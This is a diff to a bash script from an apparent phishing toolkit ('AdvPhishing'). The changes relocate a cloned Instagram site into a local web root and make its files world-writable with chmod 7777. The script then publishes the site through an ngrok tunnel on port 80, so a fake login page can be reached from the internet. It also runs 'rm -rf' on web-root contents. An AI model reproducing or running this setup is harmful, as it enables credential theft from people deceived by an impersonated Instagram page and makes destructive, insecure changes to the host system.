@@ -8,6 +8,9 @@ if [[ $checkngrok == *'ngrok'* ]]; then
 pkill -f -2 ngrok > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
 fi
+if [[ $checkngrok != *'ngrok'* ]]; then
+echo 'Ngrok Not Found'
+fi
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
@@ -62,19 +65,20 @@ echo ""
 		apt install xterm
 		apt install gnome-terminal
 		systemctl restart apache2.service
-		mkdir /var
-		mkdir /var/www
-		mkdir /var/www/html
-		mv /var/www/html/* /var/www/
-		rm -rf /var/www/html/*
-		cp -R * /var/www/html/
+		mkdir ~/AdvPhishing/sites/instagram/var
+		mkdir ~/AdvPhishing/sites/instagram/var/www
+		mkdir ~/AdvPhishing/sites/instagram/var/www/html
+		mv ~/AdvPhishing/sites/instagram/var/www/html/* ~/AdvPhishing/sites/instagram/var/www/
+		rm -rf ~/AdvPhishing/sites/instagram/var/www/html/*
+		cp -R * ~/AdvPhishing/sites/instagram/var/www/html/
 		cd ..
                 clear
-		cd /var/www/html/
+		cd ~/AdvPhishing/sites/instagram/var/www/html/
                 chmod +x *
 		chmod 7777 *
 		sleep 3
                 clear
+		
                 ./ngrok http 80 > /dev/null &
                 
                 echo ""
